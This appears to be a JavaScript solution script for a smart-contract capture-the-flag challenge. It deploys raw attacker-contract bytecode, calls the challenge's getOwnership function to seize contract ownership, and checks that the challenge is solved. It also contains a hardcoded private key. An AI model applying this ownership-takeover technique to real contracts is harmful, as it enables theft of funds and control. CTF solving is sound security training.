const ethers = require("ethers")

async function main() {
  // Connect to the RPC
  const provider = new ethers.JsonRpcProvider("https://otter.bordel.wtf/erigon")

  // Create wallet from private key
  const privateKey =
    "0x5e73f36bb68edea72cb6d8188a6e133570c0a403e926658f0587c9c81486a682"
  const wallet = new ethers.Wallet(privateKey, provider)

  console.log("Deploying from address:", wallet.address)

  // Attacker contract bytecode
  const attackerBytecode =
    "0x6080604052348015600e575f5ffd5b50607280601a5f395ff3fe60806040525f737979efa67dc53f3a86b26a83dd72a05fd5f7c53d73ffffffffffffffffffffffffffffffffffffffff165f1b9050805f5260205ff3fea26469706673582212202fa3e55d90ba8f89134f0eb8e5be7d6457df267cc161777e627db75c9887a4f864736f6c634300081c0033"

  // Deploy attacker contract
  console.log("Deploying attacker contract...")
  const tx = await wallet.sendTransaction({
    data: attackerBytecode,
    gasLimit: 200000,
  })

  const receipt = await tx.wait()
  const attackerAddress = receipt.contractAddress
  console.log("Attacker deployed at:", attackerAddress)

  // Challenge contract address
  const challengeAddress = "0x52E37B1841ccCAdE25d9FD74e768c92844a73c55"
  const setupAddress = "0x4E76D0294e69D229fA40a67E87597c58714F9b23"

  // Contract ABIs
  const challengeAbi = [
    "function getOwnership(address _addr) external",
    "function owner() external view returns (address)",
  ]
  const setupAbi = ["function isSolved() external view returns (bool)"]

  const challengeContract = new ethers.Contract(
    challengeAddress,
    challengeAbi,
    wallet
  )
  const setupContract = new ethers.Contract(setupAddress, setupAbi, wallet)

  // Call getOwnership with attacker contract address
  console.log("Calling getOwnership...")
  const exploitTx = await challengeContract.getOwnership(attackerAddress, {
    gasLimit: 200000,
  })

  await exploitTx.wait()

  // Check if we're the new owner
  const newOwner = await challengeContract.owner()
  console.log("New owner:", newOwner)
  console.log("Expected owner (us):", wallet.address)

  // Check if challenge is solved
  const isSolved = await setupContract.isSolved()
  console.log("Challenge solved:", isSolved)
}

main().catch(console.error)
